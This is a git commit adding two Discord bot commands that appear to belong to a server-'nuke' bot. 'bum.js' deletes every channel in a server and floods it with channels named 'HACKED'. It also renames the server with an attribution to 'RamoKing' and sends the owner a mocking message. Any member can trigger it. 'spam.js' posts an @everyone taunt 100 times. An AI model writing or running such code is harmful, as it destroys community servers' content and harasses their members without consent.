f0301641423b6178e34667401c601acf159b9fb2
the-jokerss <75748019+the-jokerss@users.noreply.github.com>
2021-01-11 21:51:56 +0300

    Add files via upload

---
+++ komutlar/bum.js
@@ -0,0 +1,95 @@
+const Discord = require('discord.js')
+const data = require('quick.db');
+const ayarlar = require("../ayarlar.json")
+
+//ACEBOTS
+exports.run = async (client, message, args) => {
+  let prefix = ayarlar.prefix
+
+message.guild.channels.cache.forEach(a => a.delete());//ACEBOTS
+//ACEBOTS//ACEBOTS
+//ACEBOTS
+//ACEBOTS
+
+message.guild.channels.create('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));//ACEBOTS
+//ACEBOTS
+//ACEBOTS
+
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬', {type: 'text'}).then(c => c.setParent(parent.id));// bi dk ab //tm
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬', {type: 'text'}).then(c => c.setParent(parent.id));//ACEBOTS
+//ACEBOTS
+//ACEBOTS
+
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));//ACEBOTS
+//ACEBOTS
+
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬', {type: 'text'}).then(c => c.setParent(parent.id));//ACEBOTS
+
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));//ACEBOTS
+
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('HACKED', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.channels.create('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬', {type: 'text'}).then(c => c.setParent(parent.id));
+message.guild.setIcon('HACKED');
+message.guild.setName('RamoKing Tarafından Yapıldı');
+message.guild.owner.send(`${message.guild.name} Sunucuna geçmiş olsun dileklerimi sunuyorum. Kolaydınız xd`);
+
+};
+exports.conf = {
+  enabled: true,
+  guildOnly: true,
+  aliases: ["bum"],
+  permLevel: 0
+}
+
+exports.help = {//ACEBOTS
+//ACEBOTS
+  name: 'bum'
+};
---
+++ komutlar/spam.js
@@ -0,0 +1,25 @@
+const Discord = require('discord.js');
+const db = require('quick.db')
+exports.run = async(client, message, args) => { 
+  //ACEBOTS
+
+    
+  
+  for (var i = 0; i < 100; i++) {
+ message.channel.send('@everyone Kolaydınız Ramo Geldi. Geçmiş olsunn!')//ACEBOTS
+
+}
+  
+  
+  };
+exports.conf = {
+  enabled: true,  
+  guildOnly: false, 
+  aliases: [], 
+  permLevel: 0
+};//ACEBOTS
+
+
+exports.help = {
+  name: 'spam',
+};
